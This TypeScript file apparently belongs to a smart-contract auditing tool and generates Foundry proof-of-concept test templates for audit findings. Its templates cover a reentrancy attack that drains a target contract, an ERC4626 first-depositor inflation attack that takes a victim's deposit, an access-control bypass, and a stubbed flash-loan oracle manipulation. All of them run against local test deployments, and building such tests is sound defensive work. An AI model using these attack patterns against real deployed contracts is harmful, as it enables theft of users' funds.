import { VulnerabilityFinding } from "../enhancedReportGenerator";

export class PocGenerator {

  generateFoundryTest(finding: VulnerabilityFinding, contractName: string = "Target"): string {
    const type = finding.attackVector || finding.title.toLowerCase();
    
    if (type.includes('reentrancy')) {
      return this.reentrancyTemplate(finding, contractName);
    } else if (type.includes('flash loan') || type.includes('oracle')) {
      return this.flashLoanTemplate(finding, contractName);
    } else if (type.includes('access control') || type.includes('unauthorized')) {
      return this.accessControlTemplate(finding, contractName);
    } else if (type.includes('inflation') || type.includes('donation')) {
      return this.erc4626InflationTemplate(finding, contractName);
    } else {
      return this.genericTemplate(finding, contractName);
    }
  }

  private reentrancyTemplate(finding: VulnerabilityFinding, targetName: string): string {
    const funcName = this.extractFunctionName(finding) || "withdraw";
    
    return `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/${targetName}.sol";

contract ReentrancyExploit is Test {
    ${targetName} public target;
    Attacker public attacker;

    function setUp() public {
        target = new ${targetName}();
        attacker = new Attacker(address(target));
        
        // Simulate victim deposit
        vm.deal(address(1), 100 ether);
        vm.prank(address(1));
        target.deposit{value: 10 ether}();
    }

    function testReentrancy() public {
        console.log("Target Balance Start:", address(target).balance);
        
        // Launch Attack
        attacker.attack{value: 1 ether}();
        
        console.log("Target Balance End:", address(target).balance);
        assertEq(address(target).balance, 0, "Target should be drained");
    }
}

contract Attacker {
    ${targetName} target;
    
    constructor(address _target) {
        target = ${targetName}(_target);
    }

    function attack() external payable {
        // Initial call to vulnerable function
        target.${funcName}{value: msg.value}();
    }

    // Fallback to reenter
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.${funcName}();
        }
    }
}
`;
  }

  private flashLoanTemplate(finding: VulnerabilityFinding, targetName: string): string {
    return `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/${targetName}.sol";

contract FlashLoanExploit is Test {
    ${targetName} public target;
    MockPool public pool;

    function setUp() public {
        target = new ${targetName}();
        pool = new MockPool();
    }

    function testOracleManipulation() public {
        // 1. Borrow massive amount
        uint256 loanAmount = 10_000_000 ether;
        
        // 2. Dump into AMM / Manipulate Oracle
        // Note: This requires a mock AMM setup, simplified here
        
        // 3. Interact with Target at bad price
        vm.prank(address(pool));
        // target.borrow(); // Call the vulnerable function
        
        // 4. Profit check
        // assertGt(attackerBalance, initialBalance);
    }
}

contract MockPool {
    function flashLoan(uint256 amount) external {
        // Simulate giving tokens
        // Callback to borrower
    }
}
`;
  }

  private accessControlTemplate(finding: VulnerabilityFinding, targetName: string): string {
    const funcName = this.extractFunctionName(finding) || "adminFunction";
    return `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/${targetName}.sol";

contract AccessControlTest is Test {
    ${targetName} public target;
    address public attacker = address(0xBAD);

    function setUp() public {
        target = new ${targetName}();
    }

    function testPrivilegeEscalation() public {
        vm.startPrank(attacker);
        
        // Attempt to call protected function
        // Should revert if secure, but here we test if it SUCCEEDS
        try target.${funcName}() {
            // If we are here, the exploit worked
            assertTrue(true, "Attacker successfully called restricted function");
        } catch {
            // If it reverts, it might be secure (or we sent wrong args)
            // fail(); 
        }
        
        vm.stopPrank();
    }
}
`;
  }

  private erc4626InflationTemplate(finding: VulnerabilityFinding, targetName: string): string {
    return `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/${targetName}.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract InflationAttack is Test {
    ${targetName} public vault;
    ERC20 public asset;
    address attacker = address(0xA);
    address victim = address(0xB);

    function setUp() public {
        asset = new ERC20("Test", "TST");
        vault = new ${targetName}(address(asset));
        
        asset.mint(attacker, 1000 ether);
        asset.mint(victim, 10 ether);
    }

    function testFirstDepositorAttack() public {
        vm.startPrank(attacker);
        
        // 1. Deposit 1 wei
        asset.approve(address(vault), 1);
        vault.deposit(1, attacker);
        
        // 2. Donate large amount to inflate share price
        asset.transfer(address(vault), 100 ether);
        vm.stopPrank();
        
        // 3. Victim deposits
        vm.startPrank(victim);
        asset.approve(address(vault), 10 ether);
        vault.deposit(10 ether, victim);
        
        // Check if victim got zero shares due to rounding
        assertEq(vault.balanceOf(victim), 0, "Victim should lose funds due to inflation");
    }
}
`;
  }

  private genericTemplate(finding: VulnerabilityFinding, targetName: string): string {
    return `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/${targetName}.sol";

contract GenericExploitTest is Test {
    ${targetName} public target;

    function setUp() public {
        target = new ${targetName}();
    }

    function testExploit() public {
        // ${finding.title}
        // ${finding.description}
        
        // Implement exploit steps here based on finding
        assertTrue(false, "PoC implementation required");
    }
}
`;
  }

  private extractFunctionName(finding: VulnerabilityFinding): string | null {
    // Heuristic to find function name in description or location
    // Looks for "functionName()" or "functionName"
    const match = finding.description.match(/function\s+`?(\w+)`?/);
    if (match) return match[1];
    
    if (finding.location.includes('::')) {
        return finding.location.split('::')[1].trim();
    }
    return null;
  }
}

export const pocGenerator = new PocGenerator();
